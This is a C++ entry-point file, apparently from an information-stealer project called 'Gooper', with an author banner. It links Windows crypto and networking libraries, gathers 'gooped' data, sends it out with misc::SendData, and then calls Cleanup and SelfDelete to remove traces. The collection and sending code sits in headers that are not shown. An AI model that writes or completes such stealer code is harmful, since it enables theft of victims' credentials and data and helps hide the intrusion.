//
//              .-'''-.        .-'''-.                                                        
//             '   _    \     '   _    \                                                      
//           /   /` '.   \  /   /` '.   \_________   _...._            __.....__              
//    .--./).   |     \  ' .   |     \  '\        |.'      '-.     .-''         '.            
//   /.''\\ |   '      |  '|   '      |  '\        .'```'.    '.  /     .-''"'-.  `. .-,.--.  
//  | |  | |\    \     / / \    \     / /  \      |       \     \/     /________\   \|  .-. | 
//   \`-' /  `.   ` ..' /   `.   ` ..' /    |     |        |    ||                  || |  | | 
//   /("'`      '-...-'`       '-...-'`     |      \      /    . \    .-------------'| |  | | 
//   \ '---.                                |     |\`'-.-'   .'   \    '-.____...---.| |  '-  
//    /'""'.\                               |     | '-....-'`      `.             .' | |      
//   ||     ||                             .'     '.                 `''-...... -'   | |      
//   \'. __//                            '-----------'                               |_|      
//    `'---'                           
//                                                         
//   Author: koiradog
//   Website: https://github.com/koiradog

#include <iostream>
#include "config.h"
#include "goop.h"
#include "misc.h"

#pragma comment(lib, "Crypt32")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Ws2_32.lib")

int main()
{
	Goop goop;

	if (goop.GetStatus())
	{
		misc::SendData(goop.GetGoopedData());
	}

	misc::Cleanup();
	misc::SelfDelete();

	return 0;
}